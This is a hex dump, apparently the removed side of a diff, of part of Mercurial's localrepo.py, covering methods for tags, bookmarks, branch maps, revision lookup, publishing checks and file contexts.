-00012910: 6773 2c20 7461 6774 7970 6573 2920 7768  gs, tagtypes) wh
-00012920: 6572 6520 7461 6773 206d 6170 7320 7461  ere tags maps ta
-00012930: 6720 6e61 6d65 2074 6f20 6e6f 6465 2c20  g name to node, 
-00012940: 616e 6420 7461 6774 7970 6573 0a20 2020  and tagtypes.   
-00012950: 2020 2020 206d 6170 7320 7461 6720 6e61       maps tag na
-00012960: 6d65 2074 6f20 6120 7374 7269 6e67 206c  me to a string l
-00012970: 696b 6520 5c27 676c 6f62 616c 5c27 206f  ike \'global\' o
-00012980: 7220 5c27 6c6f 6361 6c5c 272e 0a20 2020  r \'local\'..   
-00012990: 2020 2020 2053 7562 636c 6173 7365 7320       Subclasses 
-000129a0: 6f72 2065 7874 656e 7369 6f6e 7320 6172  or extensions ar
-000129b0: 6520 6672 6565 2074 6f20 6164 6420 7468  e free to add th
-000129c0: 6569 7220 6f77 6e20 7461 6773 2c20 6275  eir own tags, bu
-000129d0: 740a 2020 2020 2020 2020 7368 6f75 6c64  t.        should
-000129e0: 2062 6520 6177 6172 6520 7468 6174 2074   be aware that t
-000129f0: 6865 2072 6574 7572 6e65 6420 6469 6374  he returned dict
-00012a00: 7320 7769 6c6c 2062 6520 7265 7461 696e  s will be retain
-00012a10: 6564 2066 6f72 2074 6865 0a20 2020 2020  ed for the.     
-00012a20: 2020 2064 7572 6174 696f 6e20 6f66 2074     duration of t
-00012a30: 6865 206c 6f63 616c 7265 706f 206f 626a  he localrepo obj
-00012a40: 6563 742e 2222 220a 0a20 2020 2020 2020  ect."""..       
-00012a50: 2023 2058 5858 2077 6861 7420 7461 6774   # XXX what tagt
-00012a60: 7970 6520 7368 6f75 6c64 2073 7562 636c  ype should subcl
-00012a70: 6173 7365 732f 6578 7465 6e73 696f 6e73  asses/extensions
-00012a80: 2075 7365 3f20 2043 7572 7265 6e74 6c79   use?  Currently
-00012a90: 0a20 2020 2020 2020 2023 206d 7120 616e  .        # mq an
-00012aa0: 6420 626f 6f6b 6d61 726b 7320 6164 6420  d bookmarks add 
-00012ab0: 7461 6773 2c20 6275 7420 646f 206e 6f74  tags, but do not
-00012ac0: 2073 6574 2074 6865 2074 6167 7479 7065   set the tagtype
-00012ad0: 2061 7420 616c 6c2e 0a20 2020 2020 2020   at all..       
-00012ae0: 2023 2053 686f 756c 6420 6561 6368 2065   # Should each e
-00012af0: 7874 656e 7369 6f6e 2069 6e76 656e 7420  xtension invent 
-00012b00: 6974 7320 6f77 6e20 7461 6720 7479 7065  its own tag type
-00012b10: 3f20 2053 686f 756c 6420 7468 6572 650a  ?  Should there.
-00012b20: 2020 2020 2020 2020 2320 6265 206f 6e65          # be one
-00012b30: 2074 6167 7479 7065 2066 6f72 2061 6c6c   tagtype for all
-00012b40: 2073 7563 6820 2276 6972 7475 616c 2220   such "virtual" 
-00012b50: 7461 6773 3f20 204f 7220 6973 2074 6865  tags?  Or is the
-00012b60: 2073 7461 7475 730a 2020 2020 2020 2020   status.        
-00012b70: 2320 7175 6f20 6669 6e65 3f0a 0a20 2020  # quo fine?..   
-00012b80: 2020 2020 2023 206d 6170 2074 6167 206e       # map tag n
-00012b90: 616d 6520 746f 2028 6e6f 6465 2c20 6869  ame to (node, hi
-00012ba0: 7374 290a 2020 2020 2020 2020 616c 6c74  st).        allt
-00012bb0: 6167 7320 3d20 7461 6773 6d6f 642e 6669  ags = tagsmod.fi
-00012bc0: 6e64 676c 6f62 616c 7461 6773 2873 656c  ndglobaltags(sel
-00012bd0: 662e 7569 2c20 7365 6c66 290a 2020 2020  f.ui, self).    
-00012be0: 2020 2020 2320 6d61 7020 7461 6720 6e61      # map tag na
-00012bf0: 6d65 2074 6f20 7461 6720 7479 7065 0a20  me to tag type. 
-00012c00: 2020 2020 2020 2074 6167 7479 7065 7320         tagtypes 
-00012c10: 3d20 7b74 6167 3a20 6227 676c 6f62 616c  = {tag: b'global
-00012c20: 2720 666f 7220 7461 6720 696e 2061 6c6c  ' for tag in all
-00012c30: 7461 6773 7d0a 0a20 2020 2020 2020 2074  tags}..        t
-00012c40: 6167 736d 6f64 2e72 6561 646c 6f63 616c  agsmod.readlocal
-00012c50: 7461 6773 2873 656c 662e 7569 2c20 7365  tags(self.ui, se
-00012c60: 6c66 2c20 616c 6c74 6167 732c 2074 6167  lf, alltags, tag
-00012c70: 7479 7065 7329 0a0a 2020 2020 2020 2020  types)..        
-00012c80: 2320 4275 696c 6420 7468 6520 7265 7475  # Build the retu
-00012c90: 726e 2064 6963 7473 2e20 2048 6176 6520  rn dicts.  Have 
-00012ca0: 746f 2072 652d 656e 636f 6465 2074 6167  to re-encode tag
-00012cb0: 206e 616d 6573 2062 6563 6175 7365 0a20   names because. 
-00012cc0: 2020 2020 2020 2023 2074 6865 2074 6167         # the tag
-00012cd0: 7320 6d6f 6475 6c65 2061 6c77 6179 7320  s module always 
-00012ce0: 7573 6573 2055 5446 2d38 2028 696e 206f  uses UTF-8 (in o
-00012cf0: 7264 6572 206e 6f74 2074 6f20 6c6f 7365  rder not to lose
-00012d00: 2069 6e66 6f0a 2020 2020 2020 2020 2320   info.        # 
-00012d10: 7772 6974 696e 6720 746f 2074 6865 2063  writing to the c
-00012d20: 6163 6865 292c 2062 7574 2074 6865 2072  ache), but the r
-00012d30: 6573 7420 6f66 204d 6572 6375 7269 616c  est of Mercurial
-00012d40: 2077 616e 7473 2074 6865 6d20 696e 0a20   wants them in. 
-00012d50: 2020 2020 2020 2023 206c 6f63 616c 2065         # local e
-00012d60: 6e63 6f64 696e 672e 0a20 2020 2020 2020  ncoding..       
-00012d70: 2074 6167 7320 3d20 7b7d 0a20 2020 2020   tags = {}.     
-00012d80: 2020 2066 6f72 206e 616d 652c 2028 6e6f     for name, (no
-00012d90: 6465 2c20 6869 7374 2920 696e 2061 6c6c  de, hist) in all
-00012da0: 7461 6773 2e69 7465 6d73 2829 3a0a 2020  tags.items():.  
-00012db0: 2020 2020 2020 2020 2020 6966 206e 6f64            if nod
-00012dc0: 6520 213d 2073 656c 662e 6e75 6c6c 6964  e != self.nullid
-00012dd0: 3a0a 2020 2020 2020 2020 2020 2020 2020  :.              
-00012de0: 2020 7461 6773 5b65 6e63 6f64 696e 672e    tags[encoding.
-00012df0: 746f 6c6f 6361 6c28 6e61 6d65 295d 203d  tolocal(name)] =
-00012e00: 206e 6f64 650a 2020 2020 2020 2020 7461   node.        ta
-00012e10: 6773 5b62 2774 6970 275d 203d 2073 656c  gs[b'tip'] = sel
-00012e20: 662e 6368 616e 6765 6c6f 672e 7469 7028  f.changelog.tip(
-00012e30: 290a 2020 2020 2020 2020 7461 6774 7970  ).        tagtyp
-00012e40: 6573 203d 207b 0a20 2020 2020 2020 2020  es = {.         
-00012e50: 2020 2065 6e63 6f64 696e 672e 746f 6c6f     encoding.tolo
-00012e60: 6361 6c28 6e61 6d65 293a 2076 616c 7565  cal(name): value
-00012e70: 2066 6f72 2028 6e61 6d65 2c20 7661 6c75   for (name, valu
-00012e80: 6529 2069 6e20 7461 6774 7970 6573 2e69  e) in tagtypes.i
-00012e90: 7465 6d73 2829 0a20 2020 2020 2020 207d  tems().        }
-00012ea0: 0a20 2020 2020 2020 2072 6574 7572 6e20  .        return 
-00012eb0: 2874 6167 732c 2074 6167 7479 7065 7329  (tags, tagtypes)
-00012ec0: 0a0a 2020 2020 6465 6620 7461 6774 7970  ..    def tagtyp
-00012ed0: 6528 7365 6c66 2c20 7461 676e 616d 6529  e(self, tagname)
-00012ee0: 3a0a 2020 2020 2020 2020 2222 220a 2020  :.        """.  
-00012ef0: 2020 2020 2020 7265 7475 726e 2074 6865        return the
-00012f00: 2074 7970 6520 6f66 2074 6865 2067 6976   type of the giv
-00012f10: 656e 2074 6167 2e20 7265 7375 6c74 2063  en tag. result c
-00012f20: 616e 2062 653a 0a0a 2020 2020 2020 2020  an be:..        
-00012f30: 276c 6f63 616c 2720 203a 2061 206c 6f63  'local'  : a loc
-00012f40: 616c 2074 6167 0a20 2020 2020 2020 2027  al tag.        '
-00012f50: 676c 6f62 616c 2720 3a20 6120 676c 6f62  global' : a glob
-00012f60: 616c 2074 6167 0a20 2020 2020 2020 204e  al tag.        N
-00012f70: 6f6e 6520 2020 2020 3a20 7461 6720 646f  one     : tag do
-00012f80: 6573 206e 6f74 2065 7869 7374 0a20 2020  es not exist.   
-00012f90: 2020 2020 2022 2222 0a0a 2020 2020 2020       """..      
-00012fa0: 2020 7265 7475 726e 2073 656c 662e 5f74    return self._t
-00012fb0: 6167 7363 6163 6865 2e74 6167 7479 7065  agscache.tagtype
-00012fc0: 732e 6765 7428 7461 676e 616d 6529 0a0a  s.get(tagname)..
-00012fd0: 2020 2020 6465 6620 7461 6773 6c69 7374      def tagslist
-00012fe0: 2873 656c 6629 3a0a 2020 2020 2020 2020  (self):.        
-00012ff0: 2727 2772 6574 7572 6e20 6120 6c69 7374  '''return a list
-00013000: 206f 6620 7461 6773 206f 7264 6572 6564   of tags ordered
-00013010: 2062 7920 7265 7669 7369 6f6e 2727 270a   by revision'''.
-00013020: 2020 2020 2020 2020 6966 206e 6f74 2073          if not s
-00013030: 656c 662e 5f74 6167 7363 6163 6865 2e74  elf._tagscache.t
-00013040: 6167 736c 6973 743a 0a20 2020 2020 2020  agslist:.       
-00013050: 2020 2020 206c 203d 205b 5d0a 2020 2020       l = [].    
-00013060: 2020 2020 2020 2020 666f 7220 742c 206e          for t, n
-00013070: 2069 6e20 7365 6c66 2e74 6167 7328 292e   in self.tags().
-00013080: 6974 656d 7328 293a 0a20 2020 2020 2020  items():.       
-00013090: 2020 2020 2020 2020 206c 2e61 7070 656e           l.appen
-000130a0: 6428 2873 656c 662e 6368 616e 6765 6c6f  d((self.changelo
-000130b0: 672e 7265 7628 6e29 2c20 742c 206e 2929  g.rev(n), t, n))
-000130c0: 0a20 2020 2020 2020 2020 2020 2073 656c  .            sel
-000130d0: 662e 5f74 6167 7363 6163 6865 2e74 6167  f._tagscache.tag
-000130e0: 736c 6973 7420 3d20 5b28 742c 206e 2920  slist = [(t, n) 
-000130f0: 666f 7220 722c 2074 2c20 6e20 696e 2073  for r, t, n in s
-00013100: 6f72 7465 6428 6c29 5d0a 0a20 2020 2020  orted(l)]..     
-00013110: 2020 2072 6574 7572 6e20 7365 6c66 2e5f     return self._
-00013120: 7461 6773 6361 6368 652e 7461 6773 6c69  tagscache.tagsli
-00013130: 7374 0a0a 2020 2020 6465 6620 6e6f 6465  st..    def node
-00013140: 7461 6773 2873 656c 662c 206e 6f64 6529  tags(self, node)
-00013150: 3a0a 2020 2020 2020 2020 2727 2772 6574  :.        '''ret
-00013160: 7572 6e20 7468 6520 7461 6773 2061 7373  urn the tags ass
-00013170: 6f63 6961 7465 6420 7769 7468 2061 206e  ociated with a n
-00013180: 6f64 6527 2727 0a20 2020 2020 2020 2069  ode'''.        i
-00013190: 6620 6e6f 7420 7365 6c66 2e5f 7461 6773  f not self._tags
-000131a0: 6361 6368 652e 6e6f 6465 7461 6773 6361  cache.nodetagsca
-000131b0: 6368 653a 0a20 2020 2020 2020 2020 2020  che:.           
-000131c0: 206e 6f64 6574 6167 7363 6163 6865 203d   nodetagscache =
-000131d0: 207b 7d0a 2020 2020 2020 2020 2020 2020   {}.            
-000131e0: 666f 7220 742c 206e 2069 6e20 7365 6c66  for t, n in self
-000131f0: 2e5f 7461 6773 6361 6368 652e 7461 6773  ._tagscache.tags
-00013200: 2e69 7465 6d73 2829 3a0a 2020 2020 2020  .items():.      
-00013210: 2020 2020 2020 2020 2020 6e6f 6465 7461            nodeta
-00013220: 6773 6361 6368 652e 7365 7464 6566 6175  gscache.setdefau
-00013230: 6c74 286e 2c20 5b5d 292e 6170 7065 6e64  lt(n, []).append
-00013240: 2874 290a 2020 2020 2020 2020 2020 2020  (t).            
-00013250: 666f 7220 7461 6773 2069 6e20 6e6f 6465  for tags in node
-00013260: 7461 6773 6361 6368 652e 7661 6c75 6573  tagscache.values
-00013270: 2829 3a0a 2020 2020 2020 2020 2020 2020  ():.            
-00013280: 2020 2020 7461 6773 2e73 6f72 7428 290a      tags.sort().
-00013290: 2020 2020 2020 2020 2020 2020 7365 6c66              self
-000132a0: 2e5f 7461 6773 6361 6368 652e 6e6f 6465  ._tagscache.node
-000132b0: 7461 6773 6361 6368 6520 3d20 6e6f 6465  tagscache = node
-000132c0: 7461 6773 6361 6368 650a 2020 2020 2020  tagscache.      
-000132d0: 2020 7265 7475 726e 2073 656c 662e 5f74    return self._t
-000132e0: 6167 7363 6163 6865 2e6e 6f64 6574 6167  agscache.nodetag
-000132f0: 7363 6163 6865 2e67 6574 286e 6f64 652c  scache.get(node,
-00013300: 205b 5d29 0a0a 2020 2020 6465 6620 6e6f   [])..    def no
-00013310: 6465 626f 6f6b 6d61 726b 7328 7365 6c66  debookmarks(self
-00013320: 2c20 6e6f 6465 293a 0a20 2020 2020 2020  , node):.       
-00013330: 2022 2222 7265 7475 726e 2074 6865 206c   """return the l
-00013340: 6973 7420 6f66 2062 6f6f 6b6d 6172 6b73  ist of bookmarks
-00013350: 2070 6f69 6e74 696e 6720 746f 2074 6865   pointing to the
-00013360: 2073 7065 6369 6669 6564 206e 6f64 6522   specified node"
-00013370: 2222 0a20 2020 2020 2020 2072 6574 7572  "".        retur
-00013380: 6e20 7365 6c66 2e5f 626f 6f6b 6d61 726b  n self._bookmark
-00013390: 732e 6e61 6d65 7328 6e6f 6465 290a 0a20  s.names(node).. 
-000133a0: 2020 2064 6566 2062 7261 6e63 686d 6170     def branchmap
-000133b0: 2873 656c 6629 3a0a 2020 2020 2020 2020  (self):.        
-000133c0: 2222 2272 6574 7572 6e73 2061 2064 6963  """returns a dic
-000133d0: 7469 6f6e 6172 7920 7b62 7261 6e63 683a  tionary {branch:
-000133e0: 205b 6272 616e 6368 6865 6164 735d 7d20   [branchheads]} 
-000133f0: 7769 7468 2062 7261 6e63 6868 6561 6473  with branchheads
-00013400: 0a20 2020 2020 2020 206f 7264 6572 6564  .        ordered
-00013410: 2062 7920 696e 6372 6561 7369 6e67 2072   by increasing r
-00013420: 6576 6973 696f 6e20 6e75 6d62 6572 2222  evision number""
-00013430: 220a 2020 2020 2020 2020 7265 7475 726e  ".        return
-00013440: 2073 656c 662e 5f62 7261 6e63 6863 6163   self._branchcac
-00013450: 6865 735b 7365 6c66 5d0a 0a20 2020 2040  hes[self]..    @
-00013460: 756e 6669 6c74 6572 6564 6d65 7468 6f64  unfilteredmethod
-00013470: 0a20 2020 2064 6566 2072 6576 6272 616e  .    def revbran
-00013480: 6368 6361 6368 6528 7365 6c66 293a 0a20  chcache(self):. 
-00013490: 2020 2020 2020 2069 6620 6e6f 7420 7365         if not se
-000134a0: 6c66 2e5f 7265 7662 7261 6e63 6863 6163  lf._revbranchcac
-000134b0: 6865 3a0a 2020 2020 2020 2020 2020 2020  he:.            
-000134c0: 7365 6c66 2e5f 7265 7662 7261 6e63 6863  self._revbranchc
-000134d0: 6163 6865 203d 2062 7261 6e63 686d 6170  ache = branchmap
-000134e0: 2e72 6576 6272 616e 6368 6361 6368 6528  .revbranchcache(
-000134f0: 7365 6c66 2e75 6e66 696c 7465 7265 6428  self.unfiltered(
-00013500: 2929 0a20 2020 2020 2020 2072 6574 7572  )).        retur
-00013510: 6e20 7365 6c66 2e5f 7265 7662 7261 6e63  n self._revbranc
-00013520: 6863 6163 6865 0a0a 2020 2020 6465 6620  hcache..    def 
-00013530: 7265 6769 7374 6572 5f63 6861 6e67 6573  register_changes
-00013540: 6574 2873 656c 662c 2072 6576 2c20 6368  et(self, rev, ch
-00013550: 616e 6765 6c6f 6772 6576 6973 696f 6e29  angelogrevision)
-00013560: 3a0a 2020 2020 2020 2020 7365 6c66 2e72  :.        self.r
-00013570: 6576 6272 616e 6368 6361 6368 6528 292e  evbranchcache().
-00013580: 7365 7464 6174 6128 7265 762c 2063 6861  setdata(rev, cha
-00013590: 6e67 656c 6f67 7265 7669 7369 6f6e 290a  ngelogrevision).
-000135a0: 0a20 2020 2064 6566 2062 7261 6e63 6874  .    def brancht
-000135b0: 6970 2873 656c 662c 2062 7261 6e63 682c  ip(self, branch,
-000135c0: 2069 676e 6f72 656d 6973 7369 6e67 3d46   ignoremissing=F
-000135d0: 616c 7365 293a 0a20 2020 2020 2020 2022  alse):.        "
-000135e0: 2222 7265 7475 726e 2074 6865 2074 6970  ""return the tip
-000135f0: 206e 6f64 6520 666f 7220 6120 6769 7665   node for a give
-00013600: 6e20 6272 616e 6368 0a0a 2020 2020 2020  n branch..      
-00013610: 2020 4966 2069 676e 6f72 656d 6973 7369    If ignoremissi
-00013620: 6e67 2069 7320 5472 7565 2c20 7468 656e  ng is True, then
-00013630: 2074 6869 7320 6d65 7468 6f64 2077 696c   this method wil
-00013640: 6c20 6e6f 7420 7261 6973 6520 616e 2065  l not raise an e
-00013650: 7272 6f72 2e0a 2020 2020 2020 2020 5468  rror..        Th
-00013660: 6973 2069 7320 6865 6c70 6675 6c20 666f  is is helpful fo
-00013670: 7220 6361 6c6c 6572 7320 7468 6174 206f  r callers that o
-00013680: 6e6c 7920 6578 7065 6374 204e 6f6e 6520  nly expect None 
-00013690: 666f 7220 6120 6d69 7373 696e 6720 6272  for a missing br
-000136a0: 616e 6368 0a20 2020 2020 2020 2028 652e  anch.        (e.
-000136b0: 672e 206e 616d 6573 7061 6365 292e 0a0a  g. namespace)...
-000136c0: 2020 2020 2020 2020 2222 220a 2020 2020          """.    
-000136d0: 2020 2020 7472 793a 0a20 2020 2020 2020      try:.       
-000136e0: 2020 2020 2072 6574 7572 6e20 7365 6c66       return self
-000136f0: 2e62 7261 6e63 686d 6170 2829 2e62 7261  .branchmap().bra
-00013700: 6e63 6874 6970 2862 7261 6e63 6829 0a20  nchtip(branch). 
-00013710: 2020 2020 2020 2065 7863 6570 7420 4b65         except Ke
-00013720: 7945 7272 6f72 3a0a 2020 2020 2020 2020  yError:.        
-00013730: 2020 2020 6966 206e 6f74 2069 676e 6f72      if not ignor
-00013740: 656d 6973 7369 6e67 3a0a 2020 2020 2020  emissing:.      
-00013750: 2020 2020 2020 2020 2020 7261 6973 6520            raise 
-00013760: 6572 726f 722e 5265 706f 4c6f 6f6b 7570  error.RepoLookup
-00013770: 4572 726f 7228 5f28 6222 756e 6b6e 6f77  Error(_(b"unknow
-00013780: 6e20 6272 616e 6368 2027 2573 2722 2920  n branch '%s'") 
-00013790: 2520 6272 616e 6368 290a 2020 2020 2020  % branch).      
-000137a0: 2020 2020 2020 656c 7365 3a0a 2020 2020        else:.    
-000137b0: 2020 2020 2020 2020 2020 2020 7061 7373              pass
-000137c0: 0a0a 2020 2020 6465 6620 6c6f 6f6b 7570  ..    def lookup
-000137d0: 2873 656c 662c 206b 6579 293a 0a20 2020  (self, key):.   
-000137e0: 2020 2020 206e 6f64 6520 3d20 7363 6d75       node = scmu
-000137f0: 7469 6c2e 7265 7673 796d 626f 6c28 7365  til.revsymbol(se
-00013800: 6c66 2c20 6b65 7929 2e6e 6f64 6528 290a  lf, key).node().
-00013810: 2020 2020 2020 2020 6966 206e 6f64 6520          if node 
-00013820: 6973 204e 6f6e 653a 0a20 2020 2020 2020  is None:.       
-00013830: 2020 2020 2072 6169 7365 2065 7272 6f72       raise error
-00013840: 2e52 6570 6f4c 6f6f 6b75 7045 7272 6f72  .RepoLookupError
-00013850: 285f 2862 2275 6e6b 6e6f 776e 2072 6576  (_(b"unknown rev
-00013860: 6973 696f 6e20 2725 7327 2229 2025 206b  ision '%s'") % k
-00013870: 6579 290a 2020 2020 2020 2020 7265 7475  ey).        retu
-00013880: 726e 206e 6f64 650a 0a20 2020 2064 6566  rn node..    def
-00013890: 206c 6f6f 6b75 7062 7261 6e63 6828 7365   lookupbranch(se
-000138a0: 6c66 2c20 6b65 7929 3a0a 2020 2020 2020  lf, key):.      
-000138b0: 2020 6966 2073 656c 662e 6272 616e 6368    if self.branch
-000138c0: 6d61 7028 292e 6861 7362 7261 6e63 6828  map().hasbranch(
-000138d0: 6b65 7929 3a0a 2020 2020 2020 2020 2020  key):.          
-000138e0: 2020 7265 7475 726e 206b 6579 0a0a 2020    return key..  
-000138f0: 2020 2020 2020 7265 7475 726e 2073 636d        return scm
-00013900: 7574 696c 2e72 6576 7379 6d62 6f6c 2873  util.revsymbol(s
-00013910: 656c 662c 206b 6579 292e 6272 616e 6368  elf, key).branch
-00013920: 2829 0a0a 2020 2020 6465 6620 6b6e 6f77  ()..    def know
-00013930: 6e28 7365 6c66 2c20 6e6f 6465 7329 3a0a  n(self, nodes):.
-00013940: 2020 2020 2020 2020 636c 203d 2073 656c          cl = sel
-00013950: 662e 6368 616e 6765 6c6f 670a 2020 2020  f.changelog.    
-00013960: 2020 2020 6765 745f 7265 7620 3d20 636c      get_rev = cl
-00013970: 2e69 6e64 6578 2e67 6574 5f72 6576 0a20  .index.get_rev. 
-00013980: 2020 2020 2020 2066 696c 7465 7265 6420         filtered 
-00013990: 3d20 636c 2e66 696c 7465 7265 6472 6576  = cl.filteredrev
-000139a0: 730a 2020 2020 2020 2020 7265 7375 6c74  s.        result
-000139b0: 203d 205b 5d0a 2020 2020 2020 2020 666f   = [].        fo
-000139c0: 7220 6e20 696e 206e 6f64 6573 3a0a 2020  r n in nodes:.  
-000139d0: 2020 2020 2020 2020 2020 7220 3d20 6765            r = ge
-000139e0: 745f 7265 7628 6e29 0a20 2020 2020 2020  t_rev(n).       
-000139f0: 2020 2020 2072 6573 7020 3d20 6e6f 7420       resp = not 
-00013a00: 2872 2069 7320 4e6f 6e65 206f 7220 7220  (r is None or r 
-00013a10: 696e 2066 696c 7465 7265 6429 0a20 2020  in filtered).   
-00013a20: 2020 2020 2020 2020 2072 6573 756c 742e           result.
-00013a30: 6170 7065 6e64 2872 6573 7029 0a20 2020  append(resp).   
-00013a40: 2020 2020 2072 6574 7572 6e20 7265 7375       return resu
-00013a50: 6c74 0a0a 2020 2020 6465 6620 6c6f 6361  lt..    def loca
-00013a60: 6c28 7365 6c66 293a 0a20 2020 2020 2020  l(self):.       
-00013a70: 2072 6574 7572 6e20 7365 6c66 0a0a 2020   return self..  
-00013a80: 2020 6465 6620 7075 626c 6973 6869 6e67    def publishing
-00013a90: 2873 656c 6629 3a0a 2020 2020 2020 2020  (self):.        
-00013aa0: 2320 6974 2773 2073 6166 6520 2861 6e64  # it's safe (and
-00013ab0: 2064 6573 6972 6162 6c65 2920 746f 2074   desirable) to t
-00013ac0: 7275 7374 2074 6865 2070 7562 6c69 7368  rust the publish
-00013ad0: 2066 6c61 6720 756e 636f 6e64 6974 696f   flag unconditio
-00013ae0: 6e61 6c6c 790a 2020 2020 2020 2020 2320  nally.        # 
-00013af0: 736f 2074 6861 7420 7765 2064 6f6e 2774  so that we don't
-00013b00: 2066 696e 616c 697a 6520 6368 616e 6765   finalize change
-00013b10: 7320 7368 6172 6564 2062 6574 7765 656e  s shared between
-00013b20: 2075 7365 7273 2076 6961 2073 7368 206f   users via ssh o
-00013b30: 7220 6e66 730a 2020 2020 2020 2020 7265  r nfs.        re
-00013b40: 7475 726e 2073 656c 662e 7569 2e63 6f6e  turn self.ui.con
-00013b50: 6669 6762 6f6f 6c28 6227 7068 6173 6573  figbool(b'phases
-00013b60: 272c 2062 2770 7562 6c69 7368 272c 2075  ', b'publish', u
-00013b70: 6e74 7275 7374 6564 3d54 7275 6529 0a0a  ntrusted=True)..
-00013b80: 2020 2020 6465 6620 6361 6e63 6f70 7928      def cancopy(
-00013b90: 7365 6c66 293a 0a20 2020 2020 2020 2023  self):.        #
-00013ba0: 2073 6f20 7374 6174 6963 6874 7470 7265   so statichttpre
-00013bb0: 706f 2773 206f 7665 7272 6964 6520 6f66  po's override of
-00013bc0: 206c 6f63 616c 2829 2077 6f72 6b73 0a20   local() works. 
-00013bd0: 2020 2020 2020 2069 6620 6e6f 7420 7365         if not se
-00013be0: 6c66 2e6c 6f63 616c 2829 3a0a 2020 2020  lf.local():.    
-00013bf0: 2020 2020 2020 2020 7265 7475 726e 2046          return F
-00013c00: 616c 7365 0a20 2020 2020 2020 2069 6620  alse.        if 
-00013c10: 6e6f 7420 7365 6c66 2e70 7562 6c69 7368  not self.publish
-00013c20: 696e 6728 293a 0a20 2020 2020 2020 2020  ing():.         
-00013c30: 2020 2072 6574 7572 6e20 5472 7565 0a20     return True. 
-00013c40: 2020 2020 2020 2023 2069 6620 7075 626c         # if publ
-00013c50: 6973 6869 6e67 2077 6520 6361 6e27 7420  ishing we can't 
-00013c60: 636f 7079 2069 6620 7468 6572 6520 6973  copy if there is
-00013c70: 2066 696c 7465 7265 6420 636f 6e74 656e   filtered conten
-00013c80: 740a 2020 2020 2020 2020 7265 7475 726e  t.        return
-00013c90: 206e 6f74 2073 656c 662e 6669 6c74 6572   not self.filter
-00013ca0: 6564 2862 2776 6973 6962 6c65 2729 2e63  ed(b'visible').c
-00013cb0: 6861 6e67 656c 6f67 2e66 696c 7465 7265  hangelog.filtere
-00013cc0: 6472 6576 730a 0a20 2020 2064 6566 2073  drevs..    def s
-00013cd0: 6861 7265 6428 7365 6c66 293a 0a20 2020  hared(self):.   
-00013ce0: 2020 2020 2027 2727 7468 6520 7479 7065       '''the type
-00013cf0: 206f 6620 7368 6172 6564 2072 6570 6f73   of shared repos
-00013d00: 6974 6f72 7920 284e 6f6e 6520 6966 206e  itory (None if n
-00013d10: 6f74 2073 6861 7265 6429 2727 270a 2020  ot shared)'''.  
-00013d20: 2020 2020 2020 6966 2073 656c 662e 7368        if self.sh
-00013d30: 6172 6564 7061 7468 2021 3d20 7365 6c66  aredpath != self
-00013d40: 2e70 6174 683a 0a20 2020 2020 2020 2020  .path:.         
-00013d50: 2020 2072 6574 7572 6e20 6227 7374 6f72     return b'stor
-00013d60: 6527 0a20 2020 2020 2020 2072 6574 7572  e'.        retur
-00013d70: 6e20 4e6f 6e65 0a0a 2020 2020 6465 6620  n None..    def 
-00013d80: 776a 6f69 6e28 7365 6c66 2c20 663a 2062  wjoin(self, f: b
-00013d90: 7974 6573 2c20 2a69 6e73 6964 6566 3a20  ytes, *insidef: 
-00013da0: 6279 7465 7329 202d 3e20 6279 7465 733a  bytes) -> bytes:
-00013db0: 0a20 2020 2020 2020 2072 6574 7572 6e20  .        return 
-00013dc0: 7365 6c66 2e76 6673 2e72 656c 6a6f 696e  self.vfs.reljoin
-00013dd0: 2873 656c 662e 726f 6f74 2c20 662c 202a  (self.root, f, *
-00013de0: 696e 7369 6465 6629 0a0a 2020 2020 6465  insidef)..    de
-00013df0: 6620 7365 7470 6172 656e 7473 2873 656c  f setparents(sel
-00013e00: 662c 2070 312c 2070 323d 4e6f 6e65 293a  f, p1, p2=None):
-00013e10: 0a20 2020 2020 2020 2069 6620 7032 2069  .        if p2 i
-00013e20: 7320 4e6f 6e65 3a0a 2020 2020 2020 2020  s None:.        
-00013e30: 2020 2020 7032 203d 2073 656c 662e 6e75      p2 = self.nu
-00013e40: 6c6c 6964 0a20 2020 2020 2020 2073 656c  llid.        sel
-00013e50: 665b 4e6f 6e65 5d2e 7365 7470 6172 656e  f[None].setparen
-00013e60: 7473 2870 312c 2070 3229 0a20 2020 2020  ts(p1, p2).     
-00013e70: 2020 2073 656c 662e 5f71 7569 636b 5f61     self._quick_a
-00013e80: 6363 6573 735f 6368 616e 6765 6964 5f69  ccess_changeid_i
-00013e90: 6e76 616c 6964 6174 6528 290a 0a20 2020  nvalidate()..   
-00013ea0: 2064 6566 2066 696c 6563 7478 2873 656c   def filectx(sel
-00013eb0: 662c 2070 6174 683a 2062 7974 6573 2c20  f, path: bytes, 
-00013ec0: 6368 616e 6765 6964 3d4e 6f6e 652c 2066  changeid=None, f
-00013ed0: 696c 6569 643d 4e6f 6e65 2c20 6368 616e  ileid=None, chan
-00013ee0: 6765 6374 783d 4e6f 6e65 293a 0a20 2020  gectx=None):.   
-00013ef0: 2020 2020 2022 2222 6368 616e 6765 6964       """changeid
-00013f00: 206d 7573 7420 6265 2061 2063 6861 6e67   must be a chang
-00013f10: 6573 6574 2072 6576 6973 696f 6e2c 2069  eset revision, i
-00013f20: 6620 7370 6563 6966 6965 642e 0a20 2020  f specified..   
-00013f30: 2020 2020 2066 696c 6569 6420 6361 6e20       fileid can 
-00013f40: 6265 2061 2066 696c 6520 7265 7669 7369  be a file revisi
-00013f50: 6f6e 206f 7220 6e6f 6465 2e22 2222 0a20  on or node.""". 
-00013f60: 2020 2020 2020 2072 6574 7572 6e20 636f         return co
-00013f70: 6e74 6578 742e 6669 6c65 6374 7828 0a20  ntext.filectx(. 
-00013f80: 2020 2020 2020 2020 2020 2073 656c 662c             self,
-00013f90: 2070 6174 682c 2063 6861 6e67 6569 642c   path, changeid,
-00013fa0: 2066 696c 6569 642c 2063 6861 6e67 6563   fileid, changec
-00013fb0: 7478 3d63 6861 6e67 6563 7478 0a20 2020  tx=changectx.   
-00013fc0: 2020 2020 2029 0a0a 2020 2020 6465 6620       )..    def 
-00013fd0: 6765 7463 7764 2873 656c 6629 202d 3e20  getcwd(self) -> 
-00013fe0: 6279 7465 733a 0a20 2020 2020 2020 2072  bytes:.        r
-00013ff0: 6574 7572 6e20 7365 6c66 2e64 6972 7374  eturn self.dirst
-00014000: 6174 652e 6765 7463 7764 2829 0a0a 2020  ate.getcwd()..  
-00014010: 2020 6465 6620 7061 7468 746f 2873 656c    def pathto(sel
-00014020: 662c 2066 3a20 6279 7465 732c 2063 7764  f, f: bytes, cwd
-00014030: 3a20 4f70 7469 6f6e 616c 5b62 7974 6573  : Optional[bytes
-00014040: 5d20 3d20 4e6f 6e65 2920 2d3e 2062 7974  ] = None) -> byt
-00014050: 6573 3a0a 2020 2020 2020 2020 7265 7475  es:.        retu
